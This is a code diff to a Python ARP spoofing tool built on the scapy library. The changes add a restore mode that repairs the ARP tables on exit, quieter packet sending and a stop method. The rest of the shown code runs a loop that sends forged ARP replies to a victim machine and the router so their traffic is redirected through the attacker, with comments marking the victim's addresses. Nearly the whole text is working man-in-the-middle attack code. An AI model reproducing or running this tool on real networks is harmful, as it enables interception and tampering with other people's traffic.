@@ -17,7 +17,6 @@ class ARPspoof:
         self.router = str(router)
         self.ip_forward = bool(ip_forward)
 
-        self.__terminate = False
         self.__sleep = 1
 
         if ip_forward:
@@ -40,7 +39,7 @@ class ARPspoof:
 
         return answers[0][1].hwsrc
 
-    def send_arp_packet(self, target, source):
+    def send_arp_packet(self, target, source, restore = False):
 
         """
         DOCSTRING: this function will create and send an ARP response to spoof one side (single side)
@@ -48,15 +47,25 @@ class ARPspoof:
         source:    the ip of the source (a string)
         """
         try:
-            packet = scapy.ARP(
-                op    = 2,                          # we need to create a ARP response, not a request
-                pdst  = target,                     # the ip address of the victims machine
-                hwdst = self.request_mac(target),   # the mac address of the victims machine
-                psrc  = source                      # the ip address of the router
-            )
+            if not restore:
+                packet = scapy.ARP(
+                    op    = 2,                          # we need to create a ARP response, not a request
+                    pdst  = target,                     # the ip address of the victims machine
+                    hwdst = self.request_mac(target),   # the mac address of the victims machine
+                    psrc  = source                      # the ip address of the router
+                )
+            
+            else:
+                packet = scapy.ARP(
+                    op    = 2,                          # we need to create a ARP response, not a request
+                    pdst  = target,                     # the ip address of the victims machine
+                    hwdst = self.request_mac(target),   # the mac address of the victims machine
+                    psrc  = source,                     # the ip address of the router
+                    hwsrc = self.request_mac(source)
+                )
 
-            scapy.send(packet)     # send the created packet to the network
-            print(f"ARP response sent from {source} to {target}")
+            scapy.send(packet, verbose = False)     # send the created packet to the network
+            print(f"[+] ARP response sent from {source} to {target}")
         
         except IndexError:
             print(f"Could not find the MAC address of the given ip - {target}")
@@ -71,12 +80,19 @@ class ARPspoof:
             while True:
                 self.send_arp_packet(self.router, self.target)
                 self.send_arp_packet(self.target, self.router)
+                print()
                 time.sleep(self.__sleep)
         
         except KeyboardInterrupt:
             print("ARP spoof terminating....")
+            self.stop()
             exit()
 
         except Exception as err:
             print("Unknown error occured. Program quitting")
             print(f"Error - {err}")
+
+    def stop(self):
+        self.send_arp_packet(self.router, self.target, True)
+        self.send_arp_packet(self.target, self.router, True)
+        print("[+] Restored original ARP tables")
